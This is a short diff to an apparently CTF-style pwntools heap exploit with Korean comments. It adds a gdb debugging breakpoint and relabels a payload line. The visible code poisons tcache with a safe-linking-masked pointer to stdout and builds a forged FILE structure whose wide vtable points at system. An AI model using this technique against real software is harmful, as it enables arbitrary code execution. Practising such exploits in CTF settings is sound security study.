@@ -130,6 +130,9 @@ for i in range(3, 8): # tcache 비우기
 
 get_cat(10) # tcache-> 비어있음, fastbin은 애초에 크기 커서 그 쪽으로 갈 일 없음, smallbin에서 가져옴 cat0 가져감
 
+gdb.attach(p)
+pause()
+
 pet_cat(0, p64(elf.sym['stdout'] ^ guard)) # stdout, 원래 cat2가 담겨있었음
 
 get_cat(11) # cat2
@@ -146,7 +149,7 @@ pay += p64(0) * 3 # read_*
 pay += p64(0) * 3 # write_base, write_ptr, write_end
 pay += p64(0) * 2 # buf_base, buf_end
 pay += p64(0) * 4 # ...to the _makers
-pay += p64(system) # chain
+pay += p64(system) # wide_vtable + 0x68
 pay += p64(1)
 pay += p64(0xffffffffffffffff) # 기본값 사용
 pay += p64(0)
